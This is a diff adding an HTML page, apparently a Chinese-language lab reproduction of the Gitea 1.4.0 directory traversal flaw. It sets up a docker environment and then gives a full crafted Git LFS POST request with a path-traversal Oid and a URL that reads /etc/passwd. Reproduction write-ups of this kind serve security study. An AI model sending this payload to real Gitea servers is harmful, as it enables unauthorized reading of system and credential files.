@@ -1,0 +1,29 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
+		</title>
+		<style type="text/css">
+			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
+			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
+			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
+			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
+			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
+			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
+		</style>
+	</head>
+	<body>
+		<h1 class="csAD577193">
+			<a name="gitea-140-目录穿越导致命令执行漏洞"><span class="csDE05BCC">Gitea 1.4.0 </span><span class="csECDA2D3">目录穿越导致命令执行漏洞</span></a></h1>
+		<h2 class="cs868C439D">
+			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
+		<h2 class="cs868C439D">
+			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
+		<p class="cs40DD2BC9"><span class="cs8926E06">Gitea 1.4.0</span></p><h2 class="cs868C439D">
+			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
+		<p class="cs40DD2BC9"><span class="cs9C1B1871">执行如下命令启动启动漏洞环境：</span></p><p class="cs3A447A38"><span class="cs9FB05234">docker-compose up -d</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">环境启动后，访问</span><span class="cs9FB05234">http://www.0-sec.org:3000</span><span class="cs9C1B1871">，将进入安装页面，填写管理员账号密码，并修改网站</span><span class="cs8926E06">URL</span><span class="cs9C1B1871">，其他的用默认配置安装即可。（不要修改端口号）</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">安装完成后，创建一个公开的仓库，随便添加点文件进去（比如使用选定的文件和模板初始化仓库）：</span><span class="cs8926E06"><br/>1.png</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后，需要执行一次</span><span class="cs8926E06">docker-compose restart</span><span class="cs9C1B1871">重启</span><span class="cs8926E06">gitea</span><span class="cs9C1B1871">服务。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">由于漏洞链整体利用比较复杂，我们只复现文件读取部分，剩余利用方法详见第二个参考链接。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">打开</span><span class="cs8926E06">gitea</span><span class="cs9C1B1871">，找到刚才创建的公开项目，如</span><span class="cs9FB05234">vulhub/repo</span><span class="cs9C1B1871">，发送如下数据包，添加一个</span><span class="cs8926E06">Git LFS</span><span class="cs9C1B1871">对象：</span></p><p class="cs3A447A38"><span class="cs9FB05234">POST /vulhub/repo.git/info/lfs/objects HTTP/1.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: www.0-sec.org:3000</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Encoding: gzip, deflate</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept: application/vnd.git-lfs+json</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Language: en</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Connection: close</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Type: application/json</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Length: 151</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;Oid&quot;: &quot;....../../../etc/passwd&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;Size&quot;: 1000000,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;User&quot; : &quot;a&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;Password&quot; : &quot;a&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;Repo&quot; : &quot;a&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;Authorization&quot; : &quot;a&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后，访问</span><span class="cs9FB05234">http://www.0-sec.org:3000/vulhub/repo.git/info/lfs/objects/......%2F..%2F..%2Fetc%2Fpasswd/sth</span><span class="cs9C1B1871">，即可看到</span><span class="cs9FB05234">/etc/passwd</span><span class="cs9C1B1871">已被成功读取：</span><span class="cs8926E06"><br/>2.png</span></p></body>
+</html>
